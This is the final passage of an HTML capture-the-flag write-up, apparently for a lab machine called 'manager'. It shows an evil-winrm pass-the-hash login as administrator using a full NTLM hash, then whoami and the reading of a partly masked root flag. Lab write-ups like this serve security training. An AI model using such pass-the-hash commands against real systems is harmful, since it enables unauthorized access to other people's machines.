+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">evil</span><span class="o">-</span><span class="n">winrm</span> <span class="o">-</span><span class="n">i</span> <span class="mf">10.10.11.236</span> <span class="o">-</span><span class="n">u</span> <span class="n">administrator</span> <span class="o">-</span><span class="n">H</span> <span class="s1">'ae5064c2f62317332c88629e025924ef'</span>
+
+<span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span> <span class="n">shell</span> <span class="n">v3</span><span class="mf">.5</span>
+
+<span class="n">Info</span><span class="p">:</span> <span class="n">Establishing</span> <span class="n">connection</span> <span class="n">to</span> <span class="n">remote</span> <span class="n">endpoint</span>
+<span class="evrm">*Evil-WinRM* PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">Administrator</span>\<span class="n">Documents</span><span class="o">&gt;</span> <span class="n">whoami</span>
+<span class="n">manager</span>\<span class="n">administrator</span>
+<span class="evrm">*Evil-WinRM* PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">Administrator</span>\<span class="n">Documents</span><span class="o">&gt;</span>
+</pre></div>
+<p>Finally, we can read <code>root.txt</code>:</p><br/>
+<div class="highlight"><pre><span></span><span class="evrm">*Evil-WinRM* PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">Administrator</span>\<span class="n">Documents</span><span class="o">&gt;</span> <span class="n">cd</span> <span class="o">..</span>\<span class="n">desktop</span>
+<span class="evrm">*Evil-WinRM* PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">Administrator</span>\<span class="n">desktop</span><span class="o">&gt;</span> <span class="nb">type</span> <span class="n">root</span><span class="o">.</span><span class="n">txt</span>
+<span class="n">a4b67</span><span class="o">**********************</span><span class="mi">5</span><span class="n">a1cb</span>
+<span class="evrm">*Evil-WinRM* PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">Administrator</span>\<span class="n">desktop</span><span class="o">&gt;</span>
+</pre></div>
+            </div>
+        </div>
+    </section>
+
+    <footer>
+        <p>&copy; 2024 elswix.github.io</p>
+    </footer>
+</body>
+</html>
